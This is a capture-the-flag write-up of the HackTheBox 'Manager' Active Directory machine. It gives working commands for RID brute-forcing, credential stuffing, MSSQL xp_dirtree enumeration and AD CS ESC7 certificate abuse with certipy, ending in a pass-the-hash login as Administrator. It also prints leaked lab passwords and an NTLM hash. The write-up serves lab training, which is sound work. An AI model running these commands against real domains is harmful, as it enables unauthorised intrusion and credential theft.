---
title: "HTB - Manager (Medium | Windows | Active Directory)"
date: 2026-09-30 12:00:00 +0000
categories: [HackTheBox, Active Directory]
tags: [htb, windows, active-directory, netexec, nxc, rid-brute, credential-stuffing, mssql, xp_dirtree, evil-winrm, esc7, certipy]
description: "RID brute-forcing to enumerate users, credential stuffing into MSSQL, xp_dirtree + an anonymous SMB config leak for creds, then abuse AD CS ESC7 (ManageCA) to issue a certificate as Administrator"
image:
  path: /assets/img/manager.png
---


## Recon

```bash
nmap -p- -sSCV --open --min-rate 5000 10.129.101.70
```

```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
9389/tcp  open  mc-nmf        .NET Message Framing
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

**Service Discovery Analysis:**

Domain Controller (DC01.manager.htb) with full AD infrastructure. Critical finding: **SQL Server 2019 exposed on port 1433**. WinRM open (5985) — viable for shell if credentials obtained. LDAP accessible. Time skew: +6h59m (important for Kerberos).

### RID Brute Force

We'll perform a rid-brute attack to find users with netexec.

```bash
nxc smb manager.htb -u 'guest' -p '' --rid-brute 10000
```

![](/assets/img/manager/Pasted_image_20261005045125.png)

---

## User

### Credential Stuffing

Now we can do credential stuffing — we put the users in `users.txt` and then create another file called `pass.txt` with the same names but in lowercase, to see if it works.

```bash
nxc smb manager.htb -u users.txt -p pass.txt --no-bruteforce
```

![](/assets/img/manager/Pasted_image_20261005050547.png)

We see that Operator's credentials are operator. Let's try enumerating SMB shares, but we don't find anything interesting. We previously saw that the MSSQL server was open, let's try connecting.

```bash
impacket-mssqlclient manager.htb/Operator:operator@10.129.101.70 -windows-auth
```

Once inside we didn't find anything interesting, the `xp_dirtree` command is enabled. I wanted to receive the hash via Responder but it was impossible to crack it, so I enumerated and found interesting things.

```bash
EXEC master..xp_dirtree 'C:\inetpub\wwwroot', 1, 1;
```

![](/assets/img/manager/Pasted_image_20261005053103.png)

We see an interesting file at **C:\inetpub\wwwroot\website-backup-27-07-23-old.zip**, to download this file we'll use wget.

```bash
wget http://manager.htb/website-backup-27-07-23-old.zip
```

Then use `unzip` to decompress it. After investigating the files with `grep`, I found nothing until I used `ls -la` — I found a hidden file called `old-conf.xml`, inside it had Raven's credentials.

```bash
unzip website-backup-27-07-23-old.zip
ls -la
```

![](/assets/img/manager/Pasted_image_20261005053856.png)

Credentials obtained:

|Username|Password|
|---|---|
|raven|R4v3nBe5tD3veloP3r!123|

We test with netexec if we have access to winrm.

```bash
nxc winrm manager.htb -u 'Raven' -p 'R4v3nBe5tD3veloP3r!123'
```

![](/assets/img/manager/Pasted_image_20261005054514.png)

We see it tells us Pwn3d!, we connect with evil-winrm.

```bash
evil-winrm -i manager.htb -u 'Raven' -p 'R4v3nBe5tD3veloP3r!123'
```

![](/assets/img/manager/Pasted_image_20261005054628.png)

We capture the user flag.

---

## Root

Now we're going to use certipy to enumerate the Active Directory Certificate Services instance on Manager.

```bash
faketime "$(ntpdate -q 10.129.101.70 | cut -d ' ' -f 1,2)" \
certipy find -target manager.htb -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout
```

![](/assets/img/manager/Pasted_image_20261005055119.png)

### Overview - ESC7

**What is ESC7?**

ESC7 exploits the ManageCa permission in Active Directory Certificate Services (AD CS). If a user has ManageCa rights on the CA, they can add themselves as a CA officer, then approve denied certificate requests (including SubCA template requests with arbitrary UPN):

#### Step 1: Add yourself as an officer on the CA

```bash
faketime "$(ntpdate -q 10.129.101.70 | cut -d ' ' -f 1,2)" \
certipy ca -ca manager-DC01-CA -add-officer raven -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```

![](/assets/img/manager/Pasted_image_20261005060353.png)

#### Step 2: Request a SubCA cert as Administrator (will be denied but saves key)

```bash
faketime "$(ntpdate -q 10.129.101.70 | cut -d ' ' -f 1,2)" \
certipy req -ca manager-DC01-CA -target dc01.manager.htb -template SubCA -upn administrator@manager.htb -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```

![](/assets/img/manager/Pasted_image_20261005060410.png)

Note the request ID (e.g., 20)

#### Step 3: Issue the denied request using officer privileges

```bash
faketime "$(ntpdate -q 10.129.101.70 | cut -d ' ' -f 1,2)" \
certipy ca -ca manager-DC01-CA -issue-request 20 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```

![](/assets/img/manager/Pasted_image_20261005060515.png)

#### Step 4: Retrieve the issued certificate

```bash
faketime "$(ntpdate -q 10.129.101.70 | cut -d ' ' -f 1,2)" \
certipy req -ca manager-DC01-CA -target dc01.manager.htb -retrieve 20 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```

![](/assets/img/manager/Pasted_image_20261005060551.png)

#### Step 5: Authenticate with the certificate

```bash
faketime "$(ntpdate -q 10.129.101.70 | cut -d ' ' -f 1,2)" \
certipy auth -pfx administrator.pfx -dc-ip 10.129.101.70
```

![](/assets/img/manager/Pasted_image_20261005060628.png)


Hash obtained: `ae5064c2f62317332c88629e025924ef`

We access via evil-winrm.

```bash
evil-winrm -i manager.htb -u "Administrator" -H "ae5064c2f62317332c88629e025924ef"
```

![](/assets/img/manager/Pasted_image_20261005060847.png)

We capture the root.txt.

---

### Summary

**Attack Chain:**

1. **RID Brute Force** → Enumerated domain users (Administrator, Operator, Raven)
2. **Credential Stuffing** → Found weak credentials (Operator:operator)
3. **MSSQL Access** → Connected with Operator account via `impacket-mssqlclient`
4. **xp_dirtree Exploitation** → Attempted NetNTLM hash capture via Responder (uncrackable), pivoted to filesystem enumeration, discovered backup ZIP in web root
5. **Website Backup** → Downloaded via HTTP, extracted hidden credentials (Raven:R4v3nBe5tD3veloP3r!123)
6. **WinRM Access** → Validated Raven credentials, obtained shell
7. **AD CS Enumeration** → Certipy discovered ManageCa permission
8. **ESC7 Exploitation** → Added Raven as CA officer, requested SubCA cert as Administrator
9. **Certificate Issuance** → Approved denied request, retrieved Administrator certificate
10. **PKINIT Authentication** → Certipy auth with certificate extracted Administrator's NTLM hash
11. **Domain Admin Access** → Pass-the-Hash WinRM login as Administrator


Tags: htb, windows, active-directory, mssql, xp_dirtree, ad-cs, esc7, certipy, credential-stuffing, winrm